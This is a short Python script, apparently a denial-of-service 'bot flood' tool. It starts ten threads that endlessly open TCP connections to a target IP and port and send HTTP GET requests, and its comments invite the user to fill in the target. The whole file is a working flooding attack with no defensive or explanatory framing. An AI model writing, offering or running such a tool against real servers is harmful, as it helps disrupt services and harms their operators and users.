import socket
import threading

def flood(ip, port):
    while True:
        try:
            # Create a socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            # Connect to the target IP and port
            s.connect((ip, port))
            
            # Send a message to the target
            message = "GET / HTTP/1.1\r\nHost: " + ip + "\r\n\r\n"
            s.send(message.encode())
            
            # Print a confirmation message
            print(f"Sent request to {ip}:{port}")
            
            # Close the socket connection
            s.close()
        except Exception as e:
            print(f"Error: {e}")

# Enter the IP address and port of the target
target_ip = "192.168.0.1"
target_port = 80

# Enter the number of threads you want to use for flooding
num_threads = 10

# Start the bot flood
for _ in range(num_threads):
    threading.Thread(target=flood, args=(target_ip, target_port)).start()
